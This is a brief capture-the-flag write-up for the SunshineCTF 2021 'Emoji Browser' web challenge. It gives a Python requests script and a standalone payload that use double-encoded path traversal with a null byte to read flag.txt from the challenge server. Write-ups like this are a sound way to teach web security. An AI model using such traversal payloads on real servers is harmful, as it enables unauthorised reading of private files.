# Emoji Browser

![](../.gitbook/assets/image%20%2820%29.png)

Use pythin requests this chall is get request

```python
import requests

url = "http://emojibrowser.web.2021.sunshinectf.org:8080/emoji/..%252F..%252F..%252Fflag.txt%00"

r = requests.get(url , allow_redirects=False)

print(r.text)


```

```python
payload = emoji/..%252F..%252F..%252Fflag.txt%00
```



